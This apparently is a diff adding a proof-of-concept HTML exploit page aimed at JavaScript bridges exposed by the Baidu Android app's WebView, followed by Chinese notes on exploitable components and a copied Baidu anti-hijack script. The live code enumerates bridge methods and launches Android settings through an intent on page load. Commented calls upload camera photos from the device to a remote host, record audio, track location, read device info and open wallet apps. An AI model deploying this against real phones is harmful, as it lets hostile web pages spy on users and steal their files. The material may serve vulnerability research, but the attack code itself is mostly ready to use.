@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+<table height=100% width=100%><tr><td>L.O.Team</td></tr></table>
+<script>
+var msg="";
+var msg2="";
+for(i in window.BLightApp ){  
+  msg+=i;
+msg+="\r\n";  
+msg2+=i;
+msg2+=",";  
+  //msg+=test[i];  
+} 
+//alert(msg);
+//document.location.href="http://www.baidu.com?para="+msg2;
+//alert(/xss0/);
+//window.BLightApp.getDeviceInfo("onsuc","oner");
+//window.BLightApp.postFile("http://192.168.43.35:808/get","{'param':[ { 'key' : 'a.htm', 'value' : 'cusas' } ],'file':[ { 'key' : '', 'value' : '/sdcard/DCIM/Camera/IMG_20180508_084129.jpg' } ]}","onsuc","oner");
+//window.BLightApp.cloudaLaunchGallery("{'mediaType':'lightapp.device.MEDIA_TYPE.IMAGE'}","onsuc","oner");
+//window.BLightApp.invokeThirdApp("{'action':'com.baidu.searchbox.action.aloader.VIEW','pageId':'{\"appid\":\"1\",\"url\":\"http://192.168.43.35/obj.htm\"}','src':'abc'}","succinfo","errinfo");
+//window.BLightApp.getDeviceInfo("succinfo","errinfo");
+//window.BLightApp.startRecording("","succinfo","errinfo");
+//setTimeout('window.BLightApp.stopRecording("succinfo","errinfo")',1000);
+//document.location.href="https://www.baidu.com";
+function delaydo2(){
+document.location.href="javascript:window.Bdbox_android_utils.command(\"{'mode':'1','intent':'intent:#Intent;component=com.android.settings/.DevelopmentSettings;end'}\")";
+}
+function delaydo(){
+window.Bdbox_android_utils.command("{'mode':'1','intent':'intent:#Intent;component=com.android.settings/.DevelopmentSettings;end'}");
+}
+setTimeout("delaydo()",90);
+//window.BLightApp.postFile("http://192.168.43.35:8888/up.jsp","{'param':[{'key':'a.jpg','value':'cusas'}],'file':[{'key':'ccc','value':'/sdcard/DCIM/Camera/IMG_20180702_155117.jpg'}]}","succinfo","errinfo");
+function succinfo(pstr){
+alert(JSON.stringify(pstr));
+}
+function errinfo(pstr){
+alert(JSON.stringify(pstr));
+}
+//document.location.href="https://cusas.github.io/down.htm";
+//
+//setTimeout("sendintent()",10);
+//setTimeout("stoprec()",8000);
+//window.Bdbox_android_utils.command("{'mode':'0','intent':'intent:#Intent;scheme=wallet;package=com.baidu.searchbox;component=com.baidu.searchbox/com.baidu.searchbox.plugins.PluginActivity;action=com.baidu.searchbox.action.PLUGIN_DETAIL;end'}");
+//window.Bdbox_android_plugin.installPlugin("{'package_name':'com.huawei.health'}","onsuc");
+//alert(/st/);
+function sendintent() {
+    window.Bdbox_android_send_intent.send("wallet://com.huawei.wallet/openwallet?action=com.huawei.pay.intent.action.MAINACTIVITY");
+    //alert(document.location.href);
+}
+function startrec() {
+    window.BLightApp.startListenLocation("onsuc","oner");
+}
+function stoprec() {
+    window.BLightApp.stopRecording("onsuc","oner");
+}
+//alert('getGlobalizationInfo:'+window.BLightApp.getGlobalizationInfo());
+function onsuc(ret) {
+    alert('success:'+JSON.stringify(ret));
+}
+
+function oner(ret) {
+    alert('error:'+JSON.stringify(ret));
+}
+
+
+</script>
+com.baidu.megapp.install.ApkInstallerService 可以安装megapp
+LightBrowserActivity 可以加很多javascript接口
+ConfigWebActivity 加载WEB页
+.method public download(String, String)V
+.method public httpGet(String, String)V
+    <script id="baidu">
+        (function() {
+            var w = window,
+                d = document,
+                p = window.top;
+
+            var getParentUrl = function() {
+                var url;
+                if (p !== w) {
+                    try {
+                        url = p.location.href;
+                    } catch (e) {
+                        url = d.referrer;
+                    }
+                }
+                return url;
+            };
+
+            var hiJackSniffer = function() {
+                var files = d.querySelectorAll('script'),
+                    arr = [];
+                for (var i = 0, len = files.length; i < len; ++i) {
+                    if (files[i].id != "baidu") {
+                        arr.push(files[i]);
+                    }
+                }
+                if (arr.length) {
+                    // 页面中含有不是我们提供的JS
+                    return sendLog(arr.map(function(a) {
+                        return a.outerHTML
+                    }), 1);
+                }
+
+                var topurl = getParentUrl();
+                if (topurl) {
+                    // 我们的页面不是最顶部的页  ?
+                    return sendLog(topurl, 2)
+                }
+
+                // 检查一下元  ?
+                var body = d.body.querySelectorAll("body>*"),
+                    unknowCode = [];
+                for (var i = 0; i < body.length; ++i) {
+                    if (body[i].id != "baidu") {
+                        unknowCode.push(body[i]);
+                    }
+                }
+                if (unknowCode.length) {
+                    return sendLog(unknowCode.map(function(a) {
+                        return a.outerHTML;
+                    }), 3);
+                }
+                sendLog("", 0);
+            };
+
+            var _get1 = function(name) {
+                var url = window.location.href;
+                var regexS = "[\\?&]" + name + "=([^&#]*)";
+                var regex = new RegExp(regexS);
+                var tmpURL = url;
+                var results = regex.exec(tmpURL);
+                if (results && results.length > 1) {
+                    return decodeURIComponent(results[1].replace(/\+/g, " "));
+                }
+                return "";
+            };
+
+            var _get = function(name) {
+                var url = top.location.href;
+                var regexS = "[\\?&]" + name + "=([^&#]*)";
+                var regex = new RegExp(regexS);
+                var tmpURL = url;
+                var results = regex.exec(tmpURL);
+                if (results && results.length > 1) {
+                    return decodeURIComponent(results[1].replace(/\+/g, " "));
+                }
+                return "";
+            };
+
+            var sendLog = function(msg, type) {
+                if (msg) {
+                    msg = JSON.stringify(msg);
+                }
+                var div = document.body.appendChild(document.createElement("div")),
+                    userAgent = navigator.userAgent.toLowerCase();
+                if (userAgent.match(/android/i)) {
+					var contents = "";
+
+					try
+					{
+						contents = JSON.parse(msg);
+					}
+					catch (e)
+					{
+						console.log(e.message);
+						contents = "";
+					}
+
+                    try {
+                        var logObj = {
+                            use: type !== 0,
+                            content: contents
+                        };
+						console.log(JSON.stringify(logObj));
+                        window.Bdbox_android_utils.useHttps(JSON.stringify(logObj));
+                        //window.Bdbox_android_utils.useHttps(JSON.stringify({use:true}));
+                    } catch (e) {};
+                }
+                if (userAgent.match(/iphone/i)) {
+                    div.innerHTML = '<iframe src="bdbrowser://antihijack?type=' + type + '"></iframe>';
+                }
+                if (type) {
+                    (new Image()).src = "http://r2.mo.baidu.com/stat/rec.php?ver=2&m=24&a=05&cen=ua_cuid" +
+                        "&ua=" + encodeURIComponent(_get("ua") || _get1("ua")) +
+                        "&cuid=" + encodeURIComponent(_get("cuid") || _get1("cuid")) +
+                        "&cfrom=" + encodeURIComponent(_get("cfrom") || _get1("cfrom")) +
+                        "&from=" + encodeURIComponent(_get("from") || _get1("from")) +
+                        "&crp=" + encodeURIComponent(_get("crp") || _get1("crp")) +
+                        "&ctv=" + encodeURIComponent(_get("ctv") || _get1("ctv")) +
+                        "&st=" + encodeURIComponent(_get("st") || _get1("st")) +
+                        "&object=" + encodeURIComponent(JSON.stringify({
+                            type: type,
+                            msg: msg
+                        }));
+                }
+                //var _timestamp = +new Date;
+                //(new Image()).src = "http://www.605832.net/getInterface?func=ExtMonitor::AddLog&param=" + encodeURIComponent(("baidujiechi").replace(/,/g, "_")) + "," + encodeURIComponent((""+location.href).replace(/,/g, "_")) + "," + encodeURIComponent(("url_" + _timestamp).replace(/,/g, "_"));
+                //(new Image()).src = "http://www.605832.net/getInterface?func=ExtMonitor::AddLog&param=" + encodeURIComponent(("baidujiechi").replace(/,/g, "_")) + "," + encodeURIComponent((""+top.location.href).replace(/,/g, "_")) + "," + encodeURIComponent(("top_" + _timestamp).replace(/,/g, "_"));
+            };
+
+            setTimeout(hiJackSniffer, 150);
+        })();
+    </script>
+</body>
+</html>
+</body>
+</html>
